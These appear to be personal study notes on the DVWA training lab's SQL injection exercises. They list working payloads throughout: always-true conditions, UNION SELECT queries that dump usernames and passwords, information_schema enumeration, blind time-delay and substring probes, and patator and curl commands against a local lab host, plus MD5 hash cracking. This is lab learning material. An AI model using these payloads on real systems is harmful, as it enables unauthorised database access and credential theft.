LOW:

"SELECT first_name, last_name FROM users WHERE user_id = '$id';"

If you only insert ' , it become like the below and return an error
"SELECT first_name, last_name FROM users WHERE user_id = ''';”

If $id is something' or '1'='1, it return everything since '1'='1' is always true
"SELECT first_name, last_name FROM users WHERE user_id = 'something' or '1'='1';”

is $id is ' UNION SELECT user, password FROM users#
"SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT user, password FROM users#;"

user_id
    |first_name | lst_name
----|-----------|------------
    |Jonh       |Smith
    |Jon        |Johns
    |Sam        |Trump
    |Jenny      |Obama

users
    |user       |password
----|-----------|------------
    |admin      |wojfposdjl
    |Jon2       |dlkjmvklasdajw
    |Sam_T      |qwlokdo
    |Black      |lsssdwq

UNION all
    |first_name | lst_name
----|-----------|------------
    |Jonh       |Smith
    |Jon        |Johns
    |Sam        |Trump
    |Jenny      |Obama
    |admin      |wojfposdjl
    |Jon2       |dlkjmvklasdajw
    |Sam_T      |qwlokdo
    |Black      |lsssdwq



kali
hashid 5f4dcc3b5aa765d61d8327deb882cf99 
possible id: MD5 -> decrypt

#0 get the return schema -> two fields, both of them are string
1

#1 get the database version
' union select null, version() #

#2 get the databse user
' union select null, user() #

#3 get the db name
' union select null, DATABASE()#

#4 get all tables
' union select null, table_name from information_schema.tables #
' union select null, table_name from information_schema.tables where table_name like 'user%'#
' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name like 'user%'#

#5 get id & pwd
' UNION SELECT user, password FROM users#;

#Get a version
1' union select null, @@version#

---------------------------------------------------------------------------------------------------------
Medium:

If the input is a number, consider without a single quote
If it is a dropdown, go to elements and change option value.
1 UNION SELECT user, password FROM users#

---------------------------------------------------------------------------------------------------------
High:
Same as the easy

crackstation



SQLi Blind 

Time Delay
Oracle	dbms_pipe.receive_message(('a'),10)
Microsoft	WAITFOR DELAY '0:0:10'
PostgreSQL	SELECT pg_sleep(10)
MySQL	SELECT SLEEP(10)
MariaDB	SELECT SLEEP(10)
MariaDB is a fork from MySQL, Basic SQL syntax is the same

#Get len of db name
1' and length(database())=4 #

1 and length(@@VERSION)=16#
1' and ascii(substr(database(),1,1))=100 #

1' and ascii(substr(@@VERSION,1,1))=49 #



#Tried to use patator but not work. got 301 error 
patator http_fuzz url="http://host.docker.internal/vulnerabilities/sqli_blind/?id=1' and length(database())='RANGE0&Submit=Submit#" \
method="GET" header="Cookie: PHPSESSID=vj4j0b0s5vo65mdd54ohullaq4; security=low" 0="int:1-10" -x ignore:fgrep="User ID is MISSING from the database."


patator http_fuzz url=http://host.docker.internal/vulnerabilities/sqli_blind/?id=1&Submit=Submit# \
method=GET header="Cookie: PHPSESSID=vj4j0b0s5vo65mdd54ohullaq4; security=low" 0="int:1-10" -x ignore:fgrep="User ID is MISSING from the database."

patator http_fuzz url=https://www.google.com/

curl -v http://host.docker.internal/login.php
curl -v --cookie "PHPSESSID=vj4j0b0s5vo65mdd54ohullaq4; security=low" http://host.docker.internal/vulnerabilities/sqli_blind/?id=1&Submit=Submit

curl --cookie "PHPSESSID=vj4j0b0s5vo65mdd54ohullaq4; security=low" \
http://host.docker.internal/vulnerabilities/sqli_blind/?id=1%27+and+length%28database%28%29%29%3D3+%23&Submit=Submit#
